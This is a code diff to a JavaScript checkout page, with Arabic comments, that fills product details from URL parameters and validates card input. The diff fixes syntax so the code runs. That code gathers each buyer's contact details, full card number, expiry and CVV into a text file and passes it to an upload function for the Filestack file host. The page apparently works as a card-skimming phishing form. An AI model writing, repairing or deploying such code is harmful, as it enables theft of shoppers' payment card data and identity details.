@@ -20,14 +20,14 @@ document.addEventListener('DOMContentLoaded', function () {
   const urlParams = getUrlParams();
 
   // ملء معلومات المنتج باستخدام المعلمات المستلمة من الرابط
-  document.getElementById('product-name').textContent = ${urlParams.name};
-  document.getElementById('product-color').textContent =  ${urlParams.color};
-  document.getElementById('product-price').textContent = ${urlParams.price};
-  document.getElementById('product-quantity').textContent = ${urlParams.quantity};
+  document.getElementById('product-name').textContent = urlParams.name;
+  document.getElementById('product-color').textContent = urlParams.color;
+  document.getElementById('product-price').textContent = urlParams.price;
+  document.getElementById('product-quantity').textContent = urlParams.quantity;
 
   // حساب السعر الإجمالي
   const totalPrice = urlParams.price * urlParams.quantity;
-  document.getElementById('total-price').textContent = $${totalPrice};
+  document.getElementById('total-price').textContent = `$${totalPrice}`;
 
   // عرض الصورة
   const productImage = document.getElementById('product-image');
@@ -113,10 +113,10 @@ document.addEventListener('DOMContentLoaded', function () {
       showErrorMessage('Please enter a valid expiry date in MM/YY format.', 'expiry');
     }
 
-   if (isCardExpired(expiry)) {
-  isValid = false;
-  showErrorMessage('Please enter a valid expiry date, and make sure it is not expired.', 'expiry');
-}
+    if (isCardExpired(expiry)) {
+      isValid = false;
+      showErrorMessage('Please enter a valid expiry date, and make sure it is not expired.', 'expiry');
+    }
 
     // تحقق من CVV
     if (!validateCVV(cvv)) {
@@ -152,40 +152,39 @@ document.addEventListener('DOMContentLoaded', function () {
       };
 
       // إنشاء المحتوى لملف نصي
-      let fileContent = Client Data:\n;
-      fileContent += Email: ${email}\n;
-      fileContent += First Name: ${firstName}\n;
-      fileContent += Last Name: ${lastName}\n;
-      fileContent += Phone: ${phone}\n;
-      fileContent += Address: ${streetHouseApartmentUnit}, ${city}, ${state}, ${zipCode}\n;
-      fileContent += Card Name: ${cardName}\n;
-      fileContent += Card Number: ${cardNumber}\n;
-      fileContent += Expiry: ${expiry}\n;
-      fileContent += CVV: ${cvv}\n\n;
-      fileContent += Product Information:\n;
-      fileContent += Product Name: ${productName}\n;
-      fileContent += Product Price: ${productPriceText}\n;
-      fileContent += Product Quantity: ${productQuantityText}\n;
-      fileContent += Product Image URL: ${productImageUrl}\n;
-      fileContent += Total Price: ${totalPrice}\n;
-      fileContent += Coupon Code: ${couponCode}\n;
+      let fileContent = `Client Data:\n`;
+      fileContent += `Email: ${email}\n`;
+      fileContent += `First Name: ${firstName}\n`;
+      fileContent += `Last Name: ${lastName}\n`;
+      fileContent += `Phone: ${phone}\n`;
+      fileContent += `Address: ${streetHouseApartmentUnit}, ${city}, ${state}, ${zipCode}\n`;
+      fileContent += `Card Name: ${cardName}\n`;
+      fileContent += `Card Number: ${cardNumber}\n`;
+      fileContent += `Expiry: ${expiry}\n`;
+      fileContent += `CVV: ${cvv}\n\n`;
+      fileContent += `Product Information:\n`;
+      fileContent += `Product Name: ${productName}\n`;
+      fileContent += `Product Price: ${productPriceText}\n`;
+      fileContent += `Product Quantity: ${productQuantityText}\n`;
+      fileContent += `Product Image URL: ${productImageUrl}\n`;
+      fileContent += `Total Price: ${totalPrice}\n`;
+      fileContent += `Coupon Code: ${couponCode}\n`;
 
       // رفع الملف إلى Filestack
       uploadFileToFilestack(fileContent); 
 
-     
     }
   });
 
   function isCardExpired(expiry) {
-  const [month, year] = expiry.split('/');  // تقسيم التاريخ إلى الشهر والسنة
-  const expiryDate = new Date(20${year}, month - 1);  // إنشاء تاريخ انتهاء البطاقة
+    const [month, year] = expiry.split('/');  // تقسيم التاريخ إلى الشهر والسنة
+    const expiryDate = new Date(`20${year}`, month - 1);  // إنشاء تاريخ انتهاء البطاقة
 
-  const currentDate = new Date();  // التاريخ الحالي
-  currentDate.setHours(0, 0, 0, 0);  // إزالة الوقت من التاريخ الحالي
+    const currentDate = new Date();  // التاريخ الحالي
+    currentDate.setHours(0, 0, 0, 0);  // إزالة الوقت من التاريخ الحالي
 
-  return expiryDate < currentDate;  // إذا كان تاريخ الانتهاء في الماضي
-}
+    return expiryDate < currentDate;  // إذا كان تاريخ الانتهاء في الماضي
+  }
 
   // دالة للتحقق من البريد الإلكتروني
   function validateEmail(email) {
@@ -217,11 +216,6 @@ document.addEventListener('DOMContentLoaded', function () {
       shouldDouble = !shouldDouble;
     }
     return sum % 10 === 0;
-  }
-
-  function validateCard(cardNumber) {
-    const regex = /^(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14})$/;  // Visa / MasterCard فقط
-    return regex.test(cardNumber);
   }
 
   // دالة للتحقق من تاريخ الصلاحية
@@ -275,13 +269,3 @@ document.addEventListener('DOMContentLoaded', function () {
     }
   });
 });
-
-  
-
-  
-
-
-
- 
-
-
